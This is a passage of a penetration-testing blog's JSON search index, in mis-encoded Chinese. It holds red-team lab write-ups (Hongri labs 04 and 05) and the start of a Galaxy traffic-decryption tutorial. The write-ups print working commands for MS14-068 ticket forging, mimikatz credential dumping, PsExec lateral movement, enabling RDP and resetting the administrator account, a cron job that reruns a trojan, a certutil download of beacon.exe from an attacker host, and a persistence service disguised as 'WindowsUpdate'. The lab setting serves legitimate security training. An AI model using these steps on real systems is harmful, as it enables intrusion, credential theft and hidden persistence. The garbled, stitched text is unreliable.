éœ€å¤šè¨€ï¼š\næ¥ä¸‹æ¥å°±æ˜¯é…ç½®è·¯ç”±ï¼š\nå®Œäº‹\nç„¶åç”¨frpæ­å»ºä¸€ä¸ªéš§é“ï¼Œè¿‡ç¨‹ä¸åšèµ˜è¿°ï¼Œæ•ˆæœæ˜¯è¿™æ ·ï¼š\nè¿™æ ·å°±æ­å¥½äº†\nproxychainsä¹Ÿä¿®æ”¹ä¸€ä¸‹confï¼š\næ‰«æåŸŸå†…ä¸»æœºï¼š\nuse auxiliary/scanner/discovery/udp_probe set rhosts 192.168.183.0-255 set threads 5 run å‘ç°äº†ä¸¤å°ä¸»æœºï¼š\nTESTWIN7-PCï¼š192.168.183.128 WIN-ENS2VR5TR3Nï¼š192.168.183.130ï¼ˆè¿˜æ˜¯DNSæœåŠ¡å™¨ï¼Œæ¨æµ‹å¯èƒ½ä¸ºåŸŸæ§ï¼‰ å¯ä»¥ç”¨proxychainä»£ç†nmapè¿›è¡Œç«¯å£æ‰«æï¼š\nproxychains nmap -sP -p- 192.168.183.129 è§‰å¾—nmapæœ‰ç‚¹æ…¢ä¹Ÿå¯ä»¥ç”¨proxifierä»£ç†åœ¨windowsä¸Šï¼Œç„¶åç”¨å·¥å…·æ‰«ï¼š å®Œæ¯•ï¼Œå¤§å¤§çš„445å•Šï¼Œé¦–å…ˆæƒ³åˆ°ç»å…¸çš„ms17010æ°¸æ’ä¹‹è“\næ¨ªå‘ç§»åŠ¨ ms17010ä¸Šçº¿åŸŸæˆå‘˜ä¸»æœº è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæ”»å‡»æœºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥paylaodåº”è¯¥é€‰ç”¨æ­£å‘å³bind_tcpï¼Œå¹¶ä¸”æœ€å¥½æŠŠå…¨å±€ä»£ç†é…ä¸Šï¼š\nsetg proxies socks5:127.0.0.1:8989 æˆåŠŸäº†ï¼Œä¸ºäº†ä¿æŒç¨³å®šï¼ŒæŠŠè¿›ç¨‹æ³¨å…¥åˆ°winlog.exeé‡Œé¢ï¼Œç„¶åå†è¯•è¯•åŸŸæ§èƒ½å¦åˆ©ç”¨æ°¸æ’ä¹‹è“ï¼š\nå¤±è´¥ï¼ˆæœ‰çš„æ–‡ç« è¯´ä¹Ÿèƒ½æˆåŠŸã€‚ã€‚ã€‚ï¼‰ï¼Œé‚£ä¹ˆå…ˆæ“ä½œåŸŸæˆå‘˜ä¸»æœº\nå…ˆçœ‹çœ‹æƒé™ï¼š\nOKæ˜¯systemæƒé™\nå†çœ‹çœ‹ç³»ç»Ÿä¿¡æ¯ï¼š\nå‘ç°å­˜åœ¨åŸŸdemo.comï¼Œçœ‹çœ‹åŸŸå†…ä¸»æœºï¼š\nç”¨mimikatzæŠ“å–ä¸€ä¸‹å¯†ç ï¼š\nç›´æ¥å°±æŠ“åˆ°äº†ï¼šDotest123\næ—¢ç„¶æœ‰äº†å¯†ç ï¼Œé¦–å…ˆå°±è¯•è¯•psexecï¼š\nå¯„ï¼Œæ²¡æœ‰æˆåŠŸï¼Œå› ä¸ºé¶åœºæè¿°è¯´è¦è€ƒæŸ¥ms14068ï¼Œæ‰€ä»¥æ€€ç–‘è¿™é‡Œè¦ç”¨åŸŸå†…ææƒæ¥æ‰“DCï¼Œè¯•è¯•\nms14068åŸŸå†…ææƒ é¦–å…ˆæ˜¯æŠŠåˆ©ç”¨ç¨‹åºä¼ ä¸Šå»ï¼ˆms14-068.exeã€mimikatz.exeå’ŒPsExec64.exeï¼‰ï¼Œè¿™é‡Œé¶æœºä½œè€…äººæŒºå¥½ï¼Œç¨‹åºéƒ½åœ¨ä¸Šé¢æˆ‘å°±ä¸ä¼ äº†ï¼ˆä¸æ˜¯å› ä¸ºæˆ‘æ‡’ï¼‰\né¦–å…ˆç”Ÿæˆç¥¨æ®ï¼š\nms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123 mimikatzå¯¼å…¥TGTï¼š\nkerberos::ptc TGT_douser@DEMO.COM.ccache å¯¼å…¥åå†psexecæ¨ªå‘ç§»åŠ¨è¯•è¯•\nPsExecæ¨ªå‘ç§»åŠ¨ä¸Šçº¿DC è¿™é‡Œä½¿ç”¨PsExec64.exeå‰éœ€è¦RDPè¿æ¥è¯¥ä¸»æœºï¼Œå› ä¸ºè¿™é‡Œæ‹¿åˆ°çš„DCçš„shellæ˜¯ä¸€ä¸ªå¼¹çª—\næ³¨å†Œè¡¨å¼€å¯RDPï¼š\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f ç„¶åç”¨proxychainsè¿›è¡ŒRDPè¿æ¥ï¼š\nè¿™é‡ŒæŠ¥é”™äº†ï¼š\nå› ä¸ºæˆ‘ä»¬æ˜¯systemæƒé™ï¼Œå¯ä»¥æ”¹æœ¬åœ°administratorè´¦æˆ·çš„å¯†ç \nnet user administrator Admin123456 ç„¶åç™»å½•æœ¬åœ°administratorï¼Œä¸ç™»å½•åˆ°åŸŸï¼š\nè¿™é‡ŒåˆæŠ¥é”™ï¼Œéœ€è¦å†æ¿€æ´»ä¸€ä¸‹ç”¨æˆ·ï¼š\nnet user administrator /active:yes ç°åœ¨åº”è¯¥å¯ä»¥RDPäº†ï¼Œç™»å½•æœ¬åœ°administratorè´¦æˆ·ï¼š\næˆåŠŸç™»å½•\nå› ä¸ºdouserç”¨æˆ·æ¡Œé¢æœ‰å·¥å…·ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€ä»–çš„æ¡Œé¢æ–‡ä»¶å¤¹C:\\Users\\douser\\Desktopï¼š\nç›´æ¥å‘½ä»¤è¡Œå¯åŠ¨PsExec64.exeè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼š\nPsExec64.exe /accepteula /s \\\\WIN-ENS2VR5TR3N cmd æˆåŠŸè·å–åˆ°äº†DCçš„shellï¼Œç¡®è®¤ä¸€ä¸‹ä¿¡æ¯ï¼š okæ²¡æœ‰é—®é¢˜\næƒé™ç»´æŒ è€å¥—è·¯ï¼Œåœ¨å‡ºç½‘çš„webä¸»æœºä¸Šå†™è®¡åˆ’ä»»åŠ¡å³å¯ï¼Œå› ä¸ºwebä¸»æœºä¸Šå­˜æœ‰æˆ‘ä»¬çš„msfæœ¨é©¬ï¼ˆå¦‚æœæ²¡æœ‰migrateè¿ç§»è¿›ç¨‹çš„è¯ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·å†™è®¡åˆ’ä»»åŠ¡ï¼š\necho \u0026#34;* * * * * cd /root \u0026amp;\u0026amp; ./mshell.elf\u0026#34; \u0026gt;\u0026gt; /var/spool/cron/crontabs/root è¿™æ ·å°±ä¼šæ¯åˆ†é’Ÿæ‰§è¡Œä¾æ¬¡æœ¨é©¬ï¼Œmsfç›‘å¬å³å¯è·å¾—shellï¼š\næ€»ç»“ æœ¬æ¬¡å®è·µç”¨åˆ°çš„çŸ¥è¯†ç‚¹ä¸æ“ä½œæ–¹æ³•ï¼š\nstruts2æ¼æ´ï¼Œåˆ©ç”¨S2-045æˆåŠŸgetshell Tomcatè§£ææ¼æ´ï¼ŒPUTä¸Šä¼ å†°èé©¬getshell Dockeré€ƒé€¸ï¼Œåˆ©ç”¨dockeré…ç½®ä¸å½“å®ç°dockeré€ƒé€¸ï¼Œè·å¾—å†…ç½‘å®¿ä¸»æœºæƒé™ frpæ­å»ºå†…ç½‘éš§é“ä»£ç†ï¼Œæ–¹ä¾¿å†…ç½‘é˜¶æ®µçš„æ¸—é€ ms17-010ï¼Œæ°¸æ’ä¹‹è“è·å¾—åŸŸæˆå‘˜ä¸»æœºçš„shell ms14-068ï¼ŒåŸŸå†…ææƒé…åˆpsexecæ¨ªå‘ç§»åŠ¨æ§åˆ¶DC ",
        "summary": "çº¢æ—¥é¶åœº04 ç¯å¢ƒé…ç½® è‡ªå®šä¹‰ä¸€å¼ ç½‘å¡ vmnet1ï¼š192.168.183.0\nå°†webä¸»æœºæ·»åŠ ä¸€ä¸ªNATæ¨¡å¼çš„ç½‘å¡ï¼Œå†å°†æ‰€æœ‰ä¸»æœºï¼ˆåŒ…æ‹¬webï¼‰æ·»åŠ  vmnet1ç½‘å¡\nå¯åŠ¨ä¸»æœºï¼Œå…ˆå¯åŠ¨win7åå†å¯åŠ¨webï¼ˆå¦åˆ™ç¯å¢ƒå®¹æ˜“å‡ºé—®é¢˜ï¼‰\nä¸»æœºå¯†ç ï¼š\nwebï¼šubuntu:ubuntu DCï¼šadministrator:Test2008ï¼ˆç™»å½•æç¤ºå¯†ç è¿‡æœŸï¼Œæˆ‘è¿™é‡Œæ›´æ”¹ä¸ºAdmin123456ï¼‰ win7ï¼šdouser:Dotest123 ä¸ºäº†æ–¹ä¾¿ï¼Œç™»å½•ä¸»æœºåå¯ä»¥å°†win7çš„ç¡çœ åŠŸèƒ½å…³æ‰ï¼Œå› ä¸ºè®¡ç®—æœºä¼‘çœ åsessionså¯èƒ½ä¼šæ–­å¼€ï¼š\nç™»å½•ubuntuï¼Œæ‰“å¼€å‘½ä»¤è¡Œï¼Œsudo -sæå‡ä¸ºrootæƒé™ï¼Œç„¶åå¯åŠ¨å®¹å™¨åˆ—è¡¨å‰ä¸‰ä¸ªdockerï¼š\nè‡³æ­¤ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† IPæ¢æµ‹ ç¡®å®šIPä¸º192.168.111.134\nç«¯å£æ‰«æ å‘ç°å¼€å¯äº†22ã€2001ã€2002ã€2003ç«¯å£\nç½‘é¡µä¿¡æ¯æ”¶é›† ä¾æ¬¡è®¿é—®ä¸‰ä¸ªç«¯å£çœ‹çœ‹ï¼š\n2001ç«¯å£ é€šè¿‡ç½‘é¡µtitleå¯çŸ¥æ˜¯struts2æ¡†æ¶ï¼Œè€Œstruts2å­˜åœ¨å¾ˆå¤šå†å²æ¼æ´ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯å¯¹è¿™ä¸ªè¾“å…¥æ¡†è¿›è¡Œæ¼æ´æ£€æµ‹\n2002ç«¯å£ é¡µé¢ä¸ºtomcatï¼Œç‰ˆæœ¬ä¸º8.5.19\nåŒæ ·å¯ä»¥ä½¿ç”¨æ¼æ‰«å™¨è¿›è¡Œæ¼æ´æ£€æµ‹\n2003ç«¯å£ é¡µé¢æ˜¯phpmyadminï¼Œä½†æˆ‘è¿™é‡Œå¥½åƒå‡ºé—®é¢˜äº†ï¼š\né—®é¢˜ä¸å¤§ï¼Œå¯ä»¥å…ˆå°è¯•å‰ä¸¤ä¸ªç«¯å£æœ‰æ²¡æœ‰æ¼æ´\næ¼æ´åˆ©ç”¨ 2001ç«¯å£ S2-045ä¸Šä¼ webshell é¦–å…ˆçœ‹çœ‹2001ç«¯å£çš„struts2ï¼Œé™„ä¸Šå·¥å…·é“¾æ¥ï¼šshack2/Struts2VulsTools æ‰«æå‘ç°å­˜åœ¨S2-045å’ŒS2-046ï¼Œé‚£ä¹ˆè¯•è¯•ç”¨S2-045åˆ©ç”¨ï¼š\nä¸Šä¼ ä¸€ä¸ªå†°èwebshellï¼š\nå†°èè¿æ¥ï¼š\næˆåŠŸäº†\n2002ç«¯å£ tomcatè§£ææ¼æ´ä¸Šä¼ webshell è¿™ä¸ªç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥è¯•è¯•putæ¼æ´ï¼š\nä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ ä¸€ä¸ªå†°èé©¬ï¼Œè¿æ¥ä¸€ä¸‹ï¼š\nokè¿ä¸Šäº†ï¼Œå› ä¸º2003ç«¯å£æœ‰ç‚¹é—®é¢˜ï¼Œæ‰€ä»¥å°±åœ¨è¿™ä¸¤ä¸ªshellè¿›è¡Œåæ¸—é€\nåæ¸—é€ ç¯å¢ƒè¯†åˆ« å…ˆç®€å•ä¿¡æ¯æ”¶é›†ä¸€ä¸‹ï¼š\næƒé™éƒ½æ˜¯rootï¼Œä½†è¿™ipçœ‹èµ·æ¥ä¸å¤ªæ­£å¸¸å‘¢ï¼Œæ²¡æ‡‚\nçœ‹çœ‹ä¸»æœºåï¼š\néšæœºå­—ç¬¦ä¸²ï¼Œæœ‰ç‚¹åƒè™šæ‹Ÿå®¹å™¨å“ˆ\néªŒè¯ä¸‹çœ‹çœ‹æ˜¯ä¸æ˜¯dockerï¼š\nfind / -name .dockerenv ç»“æœå‘ç°ä¸¤ä¸ªshelléƒ½æ˜¯dockerï¼Œé‚£å°±åªæœ‰è¯•è¯•dockeré€ƒé€¸äº†\n"
    }
,
    {
        "title": "çº¢æ—¥é¶åœº05",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA05/",
        "content": "çº¢æ—¥é¶åœº05 ç¯å¢ƒæ­å»º è¿™æ¬¡çš„é¶æœºç½‘å¡æ˜¯é…ç½®å¥½çš„ï¼Œéå¸¸è´´å¿ƒ\nåªéœ€è¦æˆ‘ä»¬åœ¨è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ä¸­å°†NATæ¨¡å¼çš„ç½‘å¡IPæ”¹ä¸º192.168.135.0å³å¯å®Œæˆç½‘ç»œé…ç½®\næ¥ä¸‹æ¥ç›´æ¥å¼€æœºå³å¯\næœåŠ¡å™¨è´¦å·å¯†ç ä¿¡æ¯ï¼š\nä¸»æœº è´¦å· å¯†ç  win7 sun\\heart 123.com win7 sun\\Administrator dc123.com win2008 sun\\admin 2020.com å› ä¸ºç™»å½•ä¸»æœºåä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´æ”¹ä¸€ä¸‹å¯†ç \nwin7ï¼š sun\\Administrator:Admin12345 win2008ï¼š sun\\admin:2024.com è¿™é‡Œåªéœ€è¦ç”¨sun\\Administratorç™»å½•åˆ°win7æœåŠ¡å™¨æ‰‹åŠ¨å¼€å¯webæœåŠ¡ï¼š åœ¨C:\\phpstudyä¸­åŒå‡»è¿è¡Œphpstudy.exeï¼Œå¹¶åœ¨phpstudyä¸­ç‚¹å‡»\u0026quot;å¯åŠ¨\u0026quot;å³å¯ï¼š\nç„¶åè®¿é—®ä¸€ä¸‹192.168.135.150çœ‹ä¸‹webæœåŠ¡æ˜¯å¦å¯åŠ¨æˆåŠŸï¼š\nOKæˆåŠŸäº†ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† æ‰«ä¸€ä¸‹ç«¯å£ï¼š\nå¼€å¯äº†80ç«¯å£å’Œ3306ç«¯å£ï¼Œä¹Ÿå°±æ˜¯webæœåŠ¡å’ŒMySQLæ•°æ®åº“æœåŠ¡\nå…ˆçœ‹çœ‹webæœåŠ¡\næœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿï¼Œæ˜¯ThinkPHP V5.0æœåŠ¡\næ¼æ´åˆ©ç”¨ ThinkPHP V5.0å‘½ä»¤æ‰§è¡Œgetshell è®°å¾—ThinkPHP V5.0æœ‰å¾ˆå¤šå†å²æ¼æ´ï¼Œæœä¸€ä¸‹ï¼š\nå¯ä»¥RCEï¼Œç›´æ¥å¤åˆ¶payloadè¯•è¯•ï¼š\næˆåŠŸRCEäº†ï¼Œè€Œä¸”æ˜¯adminæƒé™ï¼Œpingä¸€ä¸‹å…¬ç½‘DNSçœ‹çœ‹èƒ½å¦å‡ºç½‘ï¼š\nOKï¼Œè¯¥ä¸»æœºå¯ä»¥æ­£å¸¸å‡ºç½‘ï¼Œé‚£ä¹ˆå…ˆå°è¯•ä¸€ä¸‹ä¸Šçº¿CS\nä¸Šä¼ exeä¸Šçº¿CS å°±æ˜¯ç”Ÿæˆexeå¹¶ä¸Šä¼ æ‰§è¡Œå³å¯ä¸Šçº¿ï¼Œç”Ÿæˆexeè¿‡ç¨‹ä¸åšèµ˜è¿°\né€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œä¸‹è½½exeï¼š\ncertutil.exe -urlcache -split -f http://192.168.135.128/beacon.exe æ‰§è¡Œå®Œæ¯•ï¼Œdirçœ‹çœ‹æˆåŠŸæ²¡ï¼š\nokä¸‹è½½æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥å¯åŠ¨exeå³å¯ä¸Šçº¿\nokæˆåŠŸä¸Šçº¿äº†\nåæ¸—é€ å› ä¸ºå½“å‰shellçš„èº«ä»½æ˜¯adminï¼Œæ‰€ä»¥å…ˆç”¨mimikatzè¯•è¯•æŠ“å–å¯†ç \næŠ“å–åˆ°äº†sun.comåŸŸç®¡ç†Administratorçš„æ˜æ–‡å¯†ç ï¼šAdmin12345\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå†…ç½‘ä¿¡æ¯æœé›†ï¼š\nå†…ç½‘ä¿¡æ¯æœé›† ä½¿ç”¨port scanæ‰«æå†…ç½‘ç½‘æ®µï¼š\nå‘ç°ç¬¬äºŒå°ä¸»æœº192.168.138.138\nå…ˆpingä¸€ä¸‹sun.comç¡®å®šä¸€ä¸‹DNSæœåŠ¡å™¨ï¼š\nåŸºæœ¬å¯ä»¥ç¡®å®š192.168.138.138æ˜¯åŸŸæ§æœåŠ¡å™¨\næ¨ªå‘ç§»åŠ¨ psexec64è¿æ¥åŸŸæ§ ç›´æ¥ç”¨mimikatzæŠ“å–åˆ°çš„å‡­è¯è¿›è¡Œpsexecæ¨ªå‘ç§»åŠ¨ï¼š\nè¿™é‡ŒlaunchæˆåŠŸä½†æ˜¯å¹¶æ²¡æœ‰è·å¾—ä¼šè¯ï¼Œå¥½åƒæ˜¯å› ä¸ºpayloadç”¨æˆåå‘è¿æ¥çš„äº†\nå› ä¸ºport scanæ‰«å‡ºæ¥ä¸¤å°ä¸»æœºå‡å¼€å¯äº†445ç«¯å£ï¼Œæ‰€ä»¥ç”¨SMBçš„æ­£å‘payloadè¯•è¯•ï¼š\nç›´æ¥è¿ä¸Šäº†ï¼š\nè¿˜æ˜¯systemæƒé™ï¼š\nè‡³æ­¤ï¼ŒæˆåŠŸè·å–ä¸¤å°ä¸»æœºçš„æ§åˆ¶æƒé™ï¼Œæ¥ä¸‹æ¥è¿›è¡Œæƒé™ç»´æŒ\næƒé™ç»´æŒ æ²¡æœ‰ä»€ä¹ˆå€¼å¾—è¯´çš„ï¼Œç›´æ¥æŠŠæˆ‘ä»¬å…ˆå‰ä¸Šä¼ çš„exeå†™å…¥è‡ªå¯åŠ¨æœåŠ¡ï¼Œå¹¶ä¸”åˆ›å»ºçš„è‡ªå¯åŠ¨æœåŠ¡å‘½åä¸ºç³»ç»Ÿæ›´æ–°æœåŠ¡ï¼š\nshell sc create \u0026#34;WindowsUpdate\u0026#34; binpath= \u0026#34;cmd /c start \u0026#34;C:\\phpStudy\\PHPTutorial\\WWW\\public\\beacon.exe\u0026#34;\u0026#34;\u0026amp;\u0026amp;sc config \u0026#34;WindowsUpdate\u0026#34; start= auto\u0026amp;\u0026amp;net start WindowsUpdate ï¼ˆå½“ç„¶è¿™é‡Œå¯ä»¥å°†exeç§»åŠ¨åˆ°æ›´éšè”½çš„è·¯å¾„ï¼‰\nå†™å…¥åï¼Œç”šè‡³ç«‹å³è·å–äº†ä¸€ä¸ªsystemæƒé™ï¼š\nå¦‚æ­¤ï¼Œå³ä½¿è¯¥ä¸»æœºé‡å¯ä¹Ÿå¯è‡ªåŠ¨ä¼šè¿CSï¼Œä¸”æƒé™ä¸ºSYSTEM\næ€»ç»“ æ€»ç»“ä¸€ä¸‹æ­¤æ¬¡å®è·µä¸­ç”¨åˆ°çš„çŸ¥è¯†ç‚¹å’Œæ“ä½œæ–¹æ³•\nThinkPHP V5.0å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ åˆ©ç”¨windowsè‡ªå¸¦çš„å·¥å…·certutilä¸‹è½½è¿œç¨‹æ¶æ„æ–‡ä»¶è‡³ä¸»æœº ç”¨mimikatzæŠ“å–çš„å‡­è¯æ¥psexecæ¨ªå‘ç§»åŠ¨æ§åˆ¶DC åˆ›å»ºè‡ªå¯åŠ¨æœåŠ¡å®ç°æƒé™ç»´æŒ ",
        "summary": "çº¢æ—¥é¶åœº05 ç¯å¢ƒæ­å»º è¿™æ¬¡çš„é¶æœºç½‘å¡æ˜¯é…ç½®å¥½çš„ï¼Œéå¸¸è´´å¿ƒ\nåªéœ€è¦æˆ‘ä»¬åœ¨è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ä¸­å°†NATæ¨¡å¼çš„ç½‘å¡IPæ”¹ä¸º192.168.135.0å³å¯å®Œæˆç½‘ç»œé…ç½®\næ¥ä¸‹æ¥ç›´æ¥å¼€æœºå³å¯\næœåŠ¡å™¨è´¦å·å¯†ç ä¿¡æ¯ï¼š\nä¸»æœº è´¦å· å¯†ç  win7 sun\\heart 123.com win7 sun\\Administrator dc123.com win2008 sun\\admin 2020.com å› ä¸ºç™»å½•ä¸»æœºåä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´æ”¹ä¸€ä¸‹å¯†ç \nwin7ï¼š sun\\Administrator:Admin12345 win2008ï¼š sun\\admin:2024.com è¿™é‡Œåªéœ€è¦ç”¨sun\\Administratorç™»å½•åˆ°win7æœåŠ¡å™¨æ‰‹åŠ¨å¼€å¯webæœåŠ¡ï¼š åœ¨C:\\phpstudyä¸­åŒå‡»è¿è¡Œphpstudy.exeï¼Œå¹¶åœ¨phpstudyä¸­ç‚¹å‡»\u0026quot;å¯åŠ¨\u0026quot;å³å¯ï¼š\nç„¶åè®¿é—®ä¸€ä¸‹192.168.135.150çœ‹ä¸‹webæœåŠ¡æ˜¯å¦å¯åŠ¨æˆåŠŸï¼š\nOKæˆåŠŸäº†ï¼Œå‡†å¤‡å¼€æ‰“\nä¿¡æ¯æœé›† æ‰«ä¸€ä¸‹ç«¯å£ï¼š\nå¼€å¯äº†80ç«¯å£å’Œ3306ç«¯å£ï¼Œä¹Ÿå°±æ˜¯webæœåŠ¡å’ŒMySQLæ•°æ®åº“æœåŠ¡\nå…ˆçœ‹çœ‹webæœåŠ¡\næœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿï¼Œæ˜¯ThinkPHP V5.0æœåŠ¡\næ¼æ´åˆ©ç”¨ ThinkPHP V5.0å‘½ä»¤æ‰§è¡Œgetshell è®°å¾—ThinkPHP V5.0æœ‰å¾ˆå¤šå†å²æ¼æ´ï¼Œæœä¸€ä¸‹ï¼š\nå¯ä»¥RCEï¼Œç›´æ¥å¤åˆ¶payloadè¯•è¯•ï¼š\næˆåŠŸRCEäº†ï¼Œè€Œä¸”æ˜¯adminæƒé™ï¼Œpingä¸€ä¸‹å…¬ç½‘DNSçœ‹çœ‹èƒ½å¦å‡ºç½‘ï¼š\nOKï¼Œè¯¥ä¸»æœºå¯ä»¥æ­£å¸¸å‡ºç½‘ï¼Œé‚£ä¹ˆå…ˆå°è¯•ä¸€ä¸‹ä¸Šçº¿CS\nä¸Šä¼ exeä¸Šçº¿CS å°±æ˜¯ç”Ÿæˆexeå¹¶ä¸Šä¼ æ‰§è¡Œå³å¯ä¸Šçº¿ï¼Œç”Ÿæˆexeè¿‡ç¨‹ä¸åšèµ˜è¿°\né€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œä¸‹è½½exeï¼š\ncertutil.exe -urlcache -split -f http://192.168.135.128/beacon.exe æ‰§è¡Œå®Œæ¯•ï¼Œdirçœ‹çœ‹æˆåŠŸæ²¡ï¼š\nokä¸‹è½½æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥å¯åŠ¨exeå³å¯ä¸Šçº¿\nokæˆåŠŸä¸Šçº¿äº†\nåæ¸—é€ å› ä¸ºå½“å‰shellçš„èº«ä»½æ˜¯adminï¼Œæ‰€ä»¥å…ˆç”¨mimikatzè¯•è¯•æŠ“å–å¯†ç \næŠ“å–åˆ°äº†sun.comåŸŸç®¡ç†Administratorçš„æ˜æ–‡å¯†ç ï¼šAdmin12345\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå†…ç½‘ä¿¡æ¯æœé›†ï¼š\nå†…ç½‘ä¿¡æ¯æœé›† ä½¿ç”¨port scanæ‰«æå†…ç½‘ç½‘æ®µï¼š\n"
    }
,
    {
        "title": "ç½‘ç«™æµé‡åŠ è§£å¯†-galaxyä½¿ç”¨",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86-galaxy%E4%BD%BF%E7%94%A8/",
        "content": "ç½‘ç«™æµé‡åŠ è§£å¯†åœºæ™¯å…¥é—¨\u0026amp;Galaxyä½¿ç”¨ è¿™é‡Œä½¿ç”¨çš„Galaxyå¼€å‘è€…çš„ç½‘ç«™demoåšæµ‹è¯•ï¼Œåœºæ™¯æ¯”è¾ƒç®€å•ï¼Œå…¥é—¨å¤Ÿç”¨\nç½‘ç«™åŠ è§£å¯†åˆ†æ å¯ä»¥çœ‹è§ç½‘ç«™æœ‰å¯¹äºusernameçš„queryåŠŸèƒ½ï¼š\nè¯·æ±‚åæŸ¥çœ‹requestå’Œresponseï¼š\nå‘ç°è¯·æ±‚å’Œè¿”å›éƒ½åŠ äº†å¯†ï¼Œå¯ä»¥çœ‹è§è¿™é‡Œæ˜¯ä»¥POSTæ–¹æ³•è¯·æ±‚/api/des-cbc/getUserInfoè·¯ç”±ï¼Œæ‰€ä»¥åœ¨æµè§ˆæ§åˆ¶å°è®¾ç½®xhræ–­ç‚¹æ‹¦æˆªè¯¥è·¯ç”±çš„POSTè¯·æ±‚ï¼š\nå†æ¬¡ç‚¹å‡»queryå‘ç°è¯·æ±‚åœåœ¨äº†æ–­ç‚¹å¤„ï¼Œä¸”å¯ä»¥çœ‹åˆ°åŠ è§£å¯†çš„ä¿¡æ¯ï¼š\nåŠ å¯†ä»£ç å¦‚ä¸‹ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥çœ‹åˆ°dataåŠ å¯†å‰çš„å€¼ï¼š\nè§£å¯†ä»£ç åœ¨è¯·æ±‚ä¹‹åï¼š\nåˆ†æä»£ç ï¼Œå¯ä»¥å¾—å‡ºç»“è®ºï¼š\ndesåŠ å¯†\nkeyä¸º12345678\nivä¸º12345678\nCBCæ¨¡å¼\npaddingä¸ºPkcs7\ngalaxyè‡ªåŠ¨åŠ è§£å¯† æ¥ä¸‹æ¥æ˜¯å·¥å…·hookéƒ¨åˆ†ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯galaxyï¼Œå½“ç„¶autodecoderä¹Ÿå¯ä»¥è¯•è¯•ï¼ˆæˆ‘è¿˜æ²¡å­¦ï¼‰ï¼š æˆ‘è¿™é‡Œé€‰æ‹©jythonçš„hookerï¼Œæ¨¡å¼å³des_cbcï¼Œhookerä¸­çš„å‚æ•°æŒ‰ç…§ä¸Šé¢åˆ†æå‡ºæ¥çš„è¿›è¡Œè®¾ç½®å³å¯:\né…ç½®å¥½ç›´æ¥startï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å¯¹åŠ å¯†çš„æµé‡åŒ…è¿›è¡Œè§£å¯†äº†ï¼š\nä¾‹å¦‚é€‰æ‹©decrypt requestï¼Œå³å¯å¾—åˆ°æ˜æ–‡è¯·æ±‚ï¼š\nå“åº”ä¹Ÿæ˜¯åŒç†ï¼š æ­¤æ—¶ï¼Œæˆ‘ä»¬å†å°†ç½‘é¡µè¯·æ±‚ä»£ç†åˆ°burpå³å¯å‘ç°è¯·æ±‚å’Œå“åº”éƒ½å·²ç»è¢«è‡ªåŠ¨è§£å¯†ï¼š\nåŒç†ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¯ä»¥å°†æœ‰åŠ å¯†çš„åŒ…send to sqlmapï¼ˆgalaxyè‡ªå¸¦çš„åŠŸèƒ½ï¼Œæ­¤æ—¶galaxyæ˜¯sqlmapå’ŒæœåŠ¡ç«¯çš„ä¸­é—´äººï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œæµé‡åŠ è§£å¯†ï¼‰ï¼Œè¿™ä¸ªå°±ä¸å¤šä»‹ç»äº†\n",
        "summary": "ç½‘ç«™æµé‡åŠ è§£å¯†åœºæ™¯å…¥é—¨\u0026amp;Galaxyä½¿ç”¨ è¿™é‡Œä½¿ç”¨çš„Galaxyå¼€å‘è€…çš„ç½‘ç«™demoåšæµ‹è¯•ï¼Œåœºæ™¯æ¯”è¾ƒç®€å•ï¼Œå…¥é—¨å¤Ÿç”¨\nç½‘ç«™åŠ è§£å¯†åˆ†æ å¯ä»¥çœ‹è§ç½‘ç«™æœ‰å¯¹äºusernameçš„queryåŠŸèƒ½ï¼š\nè¯·æ±‚åæŸ¥çœ‹requestå’Œresponseï¼š\nå‘ç°è¯·æ±‚å’Œè¿”å›éƒ½åŠ 